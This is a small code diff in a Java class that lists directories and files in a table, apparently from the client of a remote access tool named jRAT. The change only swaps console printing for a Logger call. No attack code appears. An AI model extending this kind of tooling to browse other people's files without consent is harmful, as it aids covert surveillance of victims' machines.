@@ -10,6 +10,7 @@ import java.util.List;
 import javax.swing.Icon;
 import javax.swing.table.DefaultTableModel;
 
+import pro.jrat.api.Logger;
 import pro.jrat.client.utils.IconUtils;
 
 public class FileSystem {
@@ -40,13 +41,13 @@ public class FileSystem {
 
 			for (Object[] obj : dirs) {
 				for (Object o : obj) {
-					System.out.println(o.toString());
+					Logger.log(o.toString());
 				}
 				model.addRow(obj);
 			}
 			for (Object[] obj : files) {
 				for (Object o : obj) {
-					System.out.println(o.toString());
+					Logger.log(o.toString());
 				}
 				model.addRow(obj);
 			}
